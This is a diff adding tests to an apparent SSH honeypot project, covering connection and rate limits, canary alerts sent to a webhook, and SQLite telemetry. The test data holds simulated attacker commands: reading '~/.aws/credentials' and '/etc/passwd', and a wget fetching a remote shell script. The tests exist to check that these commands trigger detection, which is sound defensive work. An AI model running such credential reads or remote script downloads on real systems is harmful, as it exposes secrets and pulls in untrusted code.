@@ -388,3 +388,121 @@ def test_a12_control_arm_gets_no_perturbation(temp_env):
 
     treated = decoy_config(temp_dir, telemetry_path, control_fraction=0.0)
     assert DecoySession(DecoyServer(host="127.0.0.1", config=treated), "SSH", "127.0.0.1").arm == "treatment"
+
+
+def test_a13_limits(temp_env):
+    """Test A13: per-IP/total connection caps, HTTP rate cap, session command cap."""
+    import asyncio
+    from src.decoy.limits import ConnectionLimiter, RateLimiter
+    limiter = ConnectionLimiter(per_ip=2, total=3)
+    assert limiter.acquire("a") and limiter.acquire("a") and not limiter.acquire("a")
+    assert limiter.acquire("b") and not limiter.acquire("c")  # total of 3 reached
+    limiter.release("a")
+    assert limiter.acquire("c")
+
+    rate = RateLimiter(limit=2, window_s=60)
+    assert rate.allow("x") and rate.allow("x") and not rate.allow("x") and rate.allow("y")
+
+    temp_dir, telemetry_path = temp_env
+    config = decoy_config(temp_dir, telemetry_path, max_commands_per_session=3,
+                          default_schedule=[(0, Regime.R0_BASELINE)])
+
+    async def scenario():
+        decoy = DecoyServer(host="127.0.0.1", config=config)
+
+        async def lines():
+            for i in range(10):
+                yield f"echo {i}"
+
+        async def drain():
+            pass
+        await decoy.run_session(lines(), lambda _: None, drain, "SSH", "127.0.0.1", prompt=None)
+
+    asyncio.run(scenario())
+    assert len(pd.read_csv(telemetry_path)) == 3
+
+
+def test_a14_ssh_connection_cap_drops_extra_connections(temp_env):
+    import paramiko
+    temp_dir, telemetry_path = temp_env
+
+    def client(ports):
+        first = paramiko.Transport(("127.0.0.1", ports["ssh"]))
+        first.connect()  # holds the only slot
+        try:
+            second = paramiko.Transport(("127.0.0.1", ports["ssh"]))
+            second.connect()
+            second.close()
+            refused = False
+        except (paramiko.SSHException, EOFError, OSError):
+            refused = True
+        first.close()
+        return refused
+
+    assert _run_with_decoy(temp_dir, telemetry_path, client, max_conns_per_ip=1) is True
+
+
+def test_a15_canary_alerts_and_webhook(temp_env):
+    """Test A15: honeytoken reads and download attempts raise one alert each (file + webhook)."""
+    import asyncio
+    import http.server
+    import json
+    import threading
+    temp_dir, telemetry_path = temp_env
+    received = []
+
+    class Hook(http.server.BaseHTTPRequestHandler):
+        def do_POST(self):
+            received.append(json.loads(self.rfile.read(int(self.headers["Content-Length"]))))
+            self.send_response(200)
+            self.end_headers()
+
+        def log_message(self, *args):
+            pass
+
+    hook = http.server.HTTPServer(("127.0.0.1", 0), Hook)
+    threading.Thread(target=hook.serve_forever, daemon=True).start()
+    alerts_path = os.path.join(temp_dir, "alerts.jsonl")
+    config = decoy_config(temp_dir, telemetry_path, alerts_path=alerts_path,
+                          alert_webhook=f"http://127.0.0.1:{hook.server_address[1]}/")
+
+    async def scenario():
+        decoy = DecoyServer(host="127.0.0.1", config=config)
+
+        async def lines():
+            for cmd in ["ls", "cat ~/.aws/credentials", "cat ~/.aws/credentials", "wget http://198.51.100.7/x.sh"]:
+                yield cmd
+
+        async def drain():
+            pass
+        await decoy.run_session(lines(), lambda _: None, drain, "SSH", "203.0.113.5", prompt=None)
+
+    asyncio.run(scenario())
+    alerts = [json.loads(line) for line in open(alerts_path)]
+    assert [(a["kind"], a["value"]) for a in alerts] == [
+        ("honeytoken_read", "/home/user/.aws/credentials"), ("download_attempt", "http://198.51.100.7/x.sh")]
+    assert alerts[0]["source_ip"] == "203.0.113.5"
+    deadline = time.time() + 5
+    while len(received) < 2 and time.time() < deadline:
+        time.sleep(0.05)
+    hook.shutdown()
+    assert len(received) == 2 and "honeytoken_read" in received[0]["text"]
+
+
+def test_a16_sqlite_telemetry_feeds_the_engine(temp_env):
+    """Test A16: a .db telemetry path stores the same rows and the CERF engine reads them."""
+    from src.analytics import CERFEngine
+    from src.analytics.telemetry_io import read_telemetry
+    temp_dir, _ = temp_env
+    db_path = os.path.join(temp_dir, "telemetry.db")
+    logger = TelemetryLogger(db_path)
+    for s in ("s1", "s2"):
+        for i, cmd in enumerate(["ls", "id", "uname -a", "cat /etc/passwd"]):
+            logger.log_event(TelemetryEvent(session_id=s, timestamp_ns=time.monotonic_ns(), source_ip="10.0.0.9",
+                                            protocol="SSH", command_index=i, command_raw=cmd,
+                                            command_root=cmd.split()[0], current_path="/", regime="baseline",
+                                            delta_t_ns=1000 * i, response_sent=True))
+    df = read_telemetry(db_path)
+    assert len(df) == 8 and df["response_sent"].all() and set(df["session_id"]) == {"s1", "s2"}
+    sessions = CERFEngine(telemetry_path=db_path, output_dir=temp_dir, embedding="pca").run_pipeline()
+    assert len(sessions) == 2
